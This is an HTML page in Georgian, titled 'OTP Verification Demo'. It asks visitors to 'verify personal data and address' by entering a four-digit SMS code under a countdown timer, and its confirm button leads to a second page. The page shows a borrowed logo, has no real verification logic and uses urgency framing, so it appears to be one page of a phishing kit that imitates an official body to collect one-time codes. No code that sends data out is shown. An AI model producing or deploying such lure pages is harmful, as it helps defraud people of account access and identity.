<!DOCTYPE html>
<html lang="ka">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>OTP Verification Demo</title>
<style>
  :root{
    --bg:#eef6f0;
    --card-border:#3fa172;
    --green:#3fa172;
    --green-dark:#2e8a5f;
    --gray:#4b4b4b;
    --gray-dark:#333;
    --text:#222;
    --red:#c0392b;
  }
  *{box-sizing:border-box;}
  html,body{
    height: 0;
    margin:0;
    font-family:'Segoe UI', Arial, sans-serif;
    background:#f7faf8;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:24px;
    padding-top:env(safe-area-inset-top,24px);
    padding-bottom:env(safe-area-inset-bottom,24px);
  }
  .card{
    margin-top:850px;
    width:100%;
    max-width:520px;
    background:var(--bg);
    border-radius:20px;
    padding:40px 32px;
    text-align:center;
  }
  .logo-placeholder{
    width:140px;
    height:70px;
    margin:0 auto 24px;
    border:2px dashed #b9cdc0;
    border-radius:8px;
    display:flex;
    align-items:center;
    justify-content:center;
    color:#9aab9f;
    font-size:13px;
  }
  h1{
    font-size:20px;
    color:var(--green-dark);
    margin:0 0 20px;
    font-weight: normal;
    line-height:1.4;
  }
  .warning{
    color:var(--red);
    font-size:14px;
    line-height:1.5;
    margin-bottom:20px;
  }
  .info{
    color:var(--text);
    font-size:14px;
    line-height:1.6;
    margin-bottom:24px;
  }
  .code-label{
    font-size:13px;
    color:#555;
    margin-bottom:12px;
  }
  .code-row{
    display:flex;
    justify-content:center;
    gap:10px;
    margin-bottom:16px;
    flex-wrap:nowrap;
  }
  .code-box{
    flex:0 1 60px;
    aspect-ratio:1/1;
    max-width:60px;
    min-width:44px;
    border-radius:10px;
    background:#fff;
    border:1px solid #dde5df;
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:22px;
    font-weight:600;
    color:var(--gray-dark);
    text-align:center;
    padding:0;
    outline:none;
    font-family:inherit;
  }
  .code-box:focus{
    border:2px solid var(--green);
  }
  .timer-bar{
    width:100%;
    background:var(--gray-dark);
    color:#fff;
    font-size:15px;
    font-weight:600;
    border-radius:10px;
    padding:14px 0;
    margin-bottom:28px;
    text-align:center;
  }
  .buttons{
    display:flex;
    flex-direction:column;
    gap:14px;
  }
  button{
    border:none;
    border-radius:10px;
    padding:14px 28px;
    font-size:15px;
    font-weight:600;
    cursor:pointer;
    width:100%;
    color:#fff;
  }
  .btn-confirm{ background:var(--green); }
  .btn-confirm:hover{ background:var(--green-dark); }
  .btn-cancel{ background:var(--gray); }
  .btn-cancel:hover{ background:var(--gray-dark); }
  .tag{
    margin-top:24px;
    font-size:11px;
    color:#aaa;
  }
  @media (max-width:360px){
    .card{ padding:32px 16px; }
    .code-row{ gap:6px; }
    .code-box{ flex-basis:50px; max-width:50px; }
    
  }
        .logo{
    width:140px;
    height:auto;
    margin-bottom:24px;
  }
</style>
</head>
<body>
  <div class="card">
         <img src="/cec.png" alt="Logo" class="logo">
    <h1>გადაამოწმეთ პირადი მონაცემები<br>და მისამართი</h1>
    <div class="warning">
    </div>
    <div class="info">
      თქვენ მიიღეთ ოთხნიშნა კოდი SMS-ის სახით, რომელიც უნდა<br>
      შეიყვანოთ ავტორიზაციის დასადასტურებლად.
    </div>
    <div class="code-label">შეიყვანეთ კოდი</div>
    <div class="code-row">
      <input class="code-box" id="d1" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
      <input class="code-box" id="d2" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
      <input class="code-box" id="d3" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
      <input class="code-box" id="d4" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
    </div>
    <div class="timer-bar" id="timer">2:40</div>
    <div class="buttons">
      <a href="index2.html"><button class="btn-confirm">დადასტურება</button></a>
      <button class="btn-cancel">გაუქმება</button>
    </div>
  </div>

<script>
  // Simple fake countdown + typed digits, purely cosmetic demo behavior
  let seconds = 160;
  const timerEl = document.getElementById('timer');
  const interval = setInterval(() => {
    seconds--;
    if(seconds <= 0){ clearInterval(interval); timerEl.textContent = "0:00"; return; }
    const m = Math.floor(seconds/60);
    const s = String(seconds%60).padStart(2,'0');
    timerEl.textContent = `${m}:${s}`;
  }, 1000);

  const boxes = ['d1','d2','d3','d4'].map(id => document.getElementById(id));
  boxes.forEach((box, i) => {
    box.addEventListener('input', () => {
      box.value = box.value.replace(/[^0-9]/g, '').slice(0,1);
      if(box.value && i < boxes.length - 1){
        boxes[i+1].focus();
      }
    });
    box.addEventListener('keydown', (e) => {
      if(e.key === 'Backspace' && !box.value && i > 0){
        boxes[i-1].focus();
      }
    });
  });
  boxes[0].focus();
</script>
</body>
</html>
